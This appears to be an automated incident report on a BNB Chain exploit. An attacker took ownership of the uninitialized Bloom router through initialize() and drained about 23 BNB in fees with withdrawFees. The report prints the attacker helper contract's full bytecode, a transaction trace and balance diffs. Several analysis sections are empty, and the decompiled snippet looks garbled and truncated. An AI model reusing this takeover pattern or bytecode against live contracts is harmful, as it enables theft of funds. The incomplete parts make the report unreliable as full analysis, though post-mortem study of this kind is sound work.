# Bloom Router Uninitialized Owner Fee-Drain Exploit

- Protocol: Bloom
- ACT Scenario: true
- Root Cause Category: protocol_bug

## ACT Opportunity & Exploit Summary

- Block height B: 46681363
- Pre-state sigma_B definition:

  BNB Chain (chainid 56) pre-state immediately before block 46681363 in which router contract 0xd4f1afd0331255e848c119ca39143d41144f7cb3 (a Bloom aggregator/router) has accumulated approximately 23.007026290916620075 BNB in native fees from prior user trades, while its packed owner/initializer storage slot at 0x9016d09d72d40fdae2fd8ceac6b6234c7706214fd39c1cd1e609a0528c199300 remains zero (no on-chain owner set). Helper contract 0x009E64c02848dc51aA3f46775c2cfBf1190C2841 does not yet exist, and EOA 0xf30be320c55038d7f784c561e56340439dd1a283 controls sufficient BNB to pay gas at 3 gwei but has not received any transfers from the router.

### Pre-state Evidence
Block metadata around exploit (BNB Chain 56):

```json
{}
```

Storage slot snapshot for router owner/initializer slot before block 46681363 (shows zero):

```text
"0x0000000000000000000000000000000000000000000000000000000000000000"
```

### Exploit Transaction (Sequence b)

- Chain: 56 (BNB Chain)
- Tx hash: 0xc7fc7e066ec2d4ea659061b75308c9016c0efab329d1055c2a8d91cc11dc3868
- Type: adversary-crafted
- Inclusion feasibility:

  Standard type-0 contract-creation transaction from an unprivileged EOA 0xf30be320c55038d7f784c561e56340439dd1a283 with value 0 and gas price 3 gwei, deploying helper contract 0x009E64c02848dc51aA3f46775c2cfBf1190C2841 whose constructor issues two external calls to the public functions initialize() and withdrawFees(address,uint256) on router 0xd4f1afd0331255e848c119ca39143d41144f7cb3. Both functions are externally callable and do not require prior privileged setup in the observed pre-state (owner slot is zero, so initialize() is callable by any address and then sets the caller as owner; withdrawFees() is callable by that owner within the same transaction). The transaction fits within normal gas limits and uses only on-chain known ABIs and calldata derivable from publicly observable state.

- Notes:

  This single transaction implements the full exploit sequence: helper deployment, takeover of the uninitialized owner slot on the Bloom router via initialize(), and immediate draining of all accumulated BNB fees via withdrawFees(0x0, full_balance) to the helper and on to the EOA.

### Exploit Profit Analysis

- Reference asset: BNB
- Adversary address: 0xf30be320c55038d7f784c561e56340439dd1a283
- Fees paid in reference asset: 429546000000000 wei (gas_used 143182 * gas_price 3 gwei)
- Value delta in reference asset: 23006167198916620075 wei (adversary balance increase 23006596744916620075 wei minus gas fees 429546000000000 wei, approximately +23.006 BNB)

Valuation notes:

  Value change is computed purely from native BNB balance diffs and gas costs for the adversary EOA in the exploit transaction. Balance diff artifacts show 0xd4f1afd0331255e848c119ca39143d41144f7cb3 decreasing by 23007026290916620075 wei and 0xf30be320c55038d7f784c561e56340439dd1a283 increasing by 23006596744916620075 wei. With gas_used=143182 and gas_price=3e9 wei, fees are 429,546,000,000,000 wei, yielding a strictly positive net profit of 23.006167198916620075 BNB independent of any external price assumptions.

Seed transaction trace for exploit tx 0xc7fc…3868 (cast run -vvvvv):

```text
Traces:
  [85652] → new <unknown>@0x009E64c02848dc51aA3f46775c2cfBf1190C2841(0x6004608090815260a4604081905260a080516001600160e01b031663204a7f0760e21b17905273d4f1afd0331255e848c119ca39143d41144f7cb3918291610047919061015c565b6000604051808303816000865af19150503d8060008114610084576040519150601f19603f3d011682016040523d82523d6000602084013e610089565b606091505b505060408051600060248201526001600160a01b038416803160448084019190915283518084039091018152606490920183526020820180516001600160e01b031663ad3b1b4760e01b17905291519192506100e49161015c565b6000604051808303816000865af19150503d8060008114610121576040519150601f19603f3d011682016040523d82523d6000602084013e610126565b606091505b50506040513291504780156108fc02916000818181858888f19350505050158015610155573d6000803e3d6000fd5b505061018b565b6000825160005b8181101561017d5760208186018101518583015201610163565b506000920191825250919050565b6042806101996000396000f3fe608060405236600a57005b00fea26469706673582212200d468ecaa52b30a94810f7ee2a66072a77350a50dcf605c615a2f9caa2797abb64736f6c63430008110033)
    ├─ [50892] 0xD4F1AFD0331255e848c119CA39143D41144f7Cb3::initialize()
    │   ├─ emit OwnershipTransferred(param0: 0x0000000000000000000000000000000000000000, param1: 0x009E64c02848dc51aA3f46775c2cfBf1190C2841)
    │   ├─ emit Initialized(: 1)
    │   ├─  storage changes:
    │   │   @ 0x9016d09d72d40fdae2fd8ceac6b6234c7706214fd39c1cd1e609a0528c199300: 0 → 0x000000000000000000000000009e64c02848dc51aa3f46775c2cfbf1190c2841
    │   │   @ 0xf0c57e16840df040f15088dc2f81fe391c3923bec73e23a9662efc9c229c6a00: 0 → 1
    │   └─ ← [Return]
    ├─ [10878] 0xD4F1AFD0331255e848c119CA39143D41144f7Cb3::withdrawFees(0x0000000000000000000000000000000000000000, 23007026290916620075 [2.3e19])
    │   ├─ [0] 0x009E64c02848dc51aA3f46775c2cfBf1190C2841::fallback{value: 23007026290916620075}()
    │   │   └─ ← [Stop]
    │   └─ ← [Return]
    ├─ [0] 0xF30Be320c55038d7F784c561E56340439Dd1a283::fallback{value: 23007026290916620075}()
    │   └─ ← [Stop]
```

Seed transaction native balance diff for router and adversary EOA:

```json
{
  "native_balance_deltas": [
    {
      "address": "0xd4f1afd0331255e848c119ca39143d41144f7cb3",
      "before_wei": "23007026290916620075",
      "after_wei": "0",
      "delta_wei": "-23007026290916620075"
    },
    {
      "address": "0xf30be320c55038d7f784c561e56340439dd1a283",
      "before_wei": "38224423300000000",
      "after_wei": "23044821168216620075",
      "delta_wei": "23006596744916620075"
    }
  ]
}
```

Router decompiled Solidity snippet highlighting withdrawFees and ownership/initializer events:

```solidity
    event OwnershipTransferred(address, address);
    event Initialized(uint64);
    /// @custom:signature   withdrawFees(address arg0, uint256 arg1) public payable returns (uint256)
    function withdrawFees(address arg0, uint256 arg1) public payable returns (uint256) {
        emit OwnershipTransferred(address(store_a), address(msg.sender));
        emit Initialized(0x01);
        emit OwnershipTransferred(address(store_a), 0);
```

## Incident Overview & TL;DR

An unprivileged EOA on BNB Chain deployed a minimal helper contract that called initialize() on an uninitialized Bloom router contract, thereby setting the helper as owner, and then immediately invoked withdrawFees(0x0, full_balance) to drain approximately 23.007 BNB of accumulated protocol fees from the router to the EOA in a single transaction.

Root cause summary:

The Bloom router contract 0xd4f1afd0331255e848c119ca39143d41144f7cb3 shipped to mainnet with an uninitialized owner/initializer slot and a publicly callable initialize() function; this allowed any attacker to become owner at any time and use withdrawFees(address,uint256) to siphon all accumulated fee balances.

## Key Background



Key contracts and addresses:



## Vulnerability & Root Cause Analysis



## Adversary Flow Analysis



## Impact & Losses

Total losses:

- 23.007026290916620075 BNB

The exploit drained the entire native BNB fee balance (23.007026290916620075 BNB) from the Bloom router contract 0xd4f1afd0331255e848c119ca39143d41144f7cb3 to the adversary-controlled EOA 0xf30be320c55038d7f784c561e56340439dd1a283. These funds represent accumulated protocol fees sourced from prior user trades through the router, so the economic impact falls on the protocol treasury and any parties entitled to those fees rather than on a single easily identifiable victim transaction.

## References

Key references:

- [1]: Seed exploit transaction metadata and balance diff (artifacts/root_cause/seed/56/0xc7fc7e066ec2d4ea659061b75308c9016c0efab329d1055c2a8d91cc11dc3868/)
- [2]: Seed exploit transaction trace (cast run) (artifacts/root_cause/seed/56/0xc7fc7e066ec2d4ea659061b75308c9016c0efab329d1055c2a8d91cc11dc3868/trace.cast.log)
- [3]: Router decompiled Solidity and ABI (artifacts/root_cause/data_collector/iter_1/contract/56/0xd4f1afd0331255e848c119ca39143d41144f7cb3/decompile/)
- [4]: Helper contract decompiled Solidity and ABI (artifacts/root_cause/data_collector/iter_1/contract/56/0x009E64c02848dc51aA3f46775c2cfBf1190C2841/decompile/)
- [5]: Router pre-exploit owner slot storage snapshot (artifacts/root_cause/data_collector/iter_2/storage/56/0xd4f1afd0331255e848c119ca39143d41144f7cb3/slot_9016d0_pre46681363.txt)
- [6]: Representative router swap traces into Bloom router (artifacts/root_cause/data_collector/iter_2/tx/56/)
- [7]: Router and adversary EOA transaction histories (artifacts/root_cause/data_collector/iter_1/address/56/)

## All Relevant Transactions

- Chainid 56, tx 0xc7fc7e066ec2d4ea659061b75308c9016c0efab329d1055c2a8d91cc11dc3868 (adversary-crafted)
- Chainid 56, tx 0x9352bdee11fee15417c65d0fd1e5200ccab7c10da1e8052d25593732d331d3d7 (related)
- Chainid 56, tx 0xdcc8954dd822dd26a4666e0506fd6e0a82de9063b9b36351baf88d1280337e14 (related)